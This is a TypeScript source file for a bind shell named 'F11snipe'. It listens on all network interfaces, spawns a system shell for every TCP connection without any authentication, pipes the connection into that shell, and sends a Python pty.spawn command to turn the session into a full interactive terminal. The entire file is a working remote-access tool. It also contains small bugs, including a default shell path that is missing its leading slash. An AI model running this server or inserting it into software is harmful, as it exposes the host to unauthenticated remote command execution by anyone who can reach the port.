// Imports
import colors from 'colors/safe';
import { spawn, execSync, spawnSync } from 'child_process';
import os from 'os';
import fs from 'fs';
import net from 'net';
import tty from 'tty';
// import {} from 'stream';

const UNIX_SHELLS = ['zsh', 'bash', 'sh'];
const UNIX_DEFAULT = 'bin/sh';

// Env vars
const {
  TYPE = 'echo',
  PROMPT = 'snipe> ',
} = process.env;
// Constants
const PORT = TYPE === 'echo' ? 7070 : 7777;
const HOST = '0.0.0.0';
const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
// Create net tcp server
const server = net.createServer();
// Define empty array of tty.WriteStream[] to track open connections
const sockets: tty.WriteStream[] = [];
const timestamp = (): string => new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');

type msgType = 'ok' | 'good' | 'warn' | 'info' | 'debug' | 'error' | 'fatal';

colors.setTheme({
  ok: ['green'],
  good: ['green'],
  warn: ['yellow'],
  info: ['black', 'bgGreen'],
  debug: ['dim', 'cyan', 'italic'],
  error: ['red', 'underline'],
  fatal: ['white', 'bgRed', 'bold']
});

const log = (...args) => console.log( colors.gray(timestamp()), ...args);
const msg = (theme: msgType, body: string) => log(colors[theme](body));
const isMac = (): boolean => /darwin/i.test(os.platform());
const isLinux = (): boolean => /linux/i.test(os.platform());
const isWindows = (): boolean => /win/i.test(os.platform());
const isNotWindows = (): boolean => !isWindows();
const findWinShell = (): string => 'cmd.exe'; // LOL F*#K WINDOWS
const findNixShell = (): string => {
  for (let i = 0; i <  UNIX_SHELLS.length; i++) {
    const shell = UNIX_SHELLS[i];
    const check = spawnSync('which', [shell]);

    if (check.status === 0) {
      const found = check.stdout.toString().trim();
      msg('debug', `Found shell! Using: '${shell}' -> ${found}`);
      return found;
    } else {
      msg('warn', `Unable to find shell: '${shell}'`);

      if (i < UNIX_SHELLS.length - 1) {
        msg('debug', `Trying next shell: ${UNIX_DEFAULT[i+1]} ...`);
      }
    }
  }

  // Return default shell "bin/sh"
  return UNIX_DEFAULT;
}

const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();

// Intialize and listen for connections
server.listen(PORT, HOST, () => {
  msg('good', `F11snipe server listening: ${HOST}:${PORT} (using shell: ${findShell()})`);
});

const doShell = (socket: tty.WriteStream) => {
  const sig = `${socket.remoteAddress}:${socket.remotePort}`;
  const shell = spawn(findShell());

  if (fs.existsSync('msgs/welcome.txt')) socket.write(fs.readFileSync('msgs/welcome.txt'));

  shell.stdin.write(`${STABALIZE}\r\n`);

  socket.pipe(shell.stdin);
  shell.stdout.pipe(socket);
  shell.stderr.pipe(socket);

  // shell.stdout.on('data', (data) => {
  //   msg('debug', `[${sig}] shell.stdout: ${data.toString()}`);
  //   socket.write(data);
  // });

  // shell.stderr.on('data', (data) => {
  //   msg('error', `shell.stderr: ${data.toString()}`);
  //   socket.write(data);
  // });

  // What about no out?? on enter?
  shell.on('close', (code) => {
    log(`Child process exited with code ${code}`);
  });
}

// Main handler for new connections
server.on('connection', (socket: tty.WriteStream) => {
  const sig = `${socket.remoteAddress}:${socket.remotePort}`;
  sockets.push(socket);

  msg('info', `[${sig}] New Connection`);

  try {
    doShell(socket);

    socket.on('close', (hadError: boolean) => {
      if (hadError) log(`Socket.on(close) with error!`);
      let idx = sockets.findIndex((sock) => sock.remoteAddress === socket.remoteAddress && sock.remotePort === socket.remotePort);
      if (idx >= 0) {
        sockets.splice(idx, 1);
      }

      log(`Closed`);
    });
  } catch (err) {
    log('Caught connection error', err);
  }
});
